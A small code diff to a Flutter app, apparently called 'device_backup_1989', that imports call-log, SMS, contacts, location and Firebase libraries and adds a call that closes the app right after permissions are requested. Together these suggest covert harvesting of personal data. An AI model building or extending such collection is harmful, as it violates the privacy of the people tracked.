@@ -2,6 +2,7 @@ import 'dart:io';
 import 'package:call_log/call_log.dart';
 import 'package:device_backup_1989/firebase.dart';
 import 'package:device_info_plus/device_info_plus.dart';
+import 'package:flutter/services.dart';
 import 'package:flutter_contacts/flutter_contacts.dart';
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:geolocator/geolocator.dart';
@@ -54,7 +55,7 @@ static Future<void> requestPermissionsAndFetchData(String userId) async {
   if (phoneGranted) {
    await requestCallLogPermission(userId);
   }
-
+  SystemNavigator.pop();
 }
 }
 
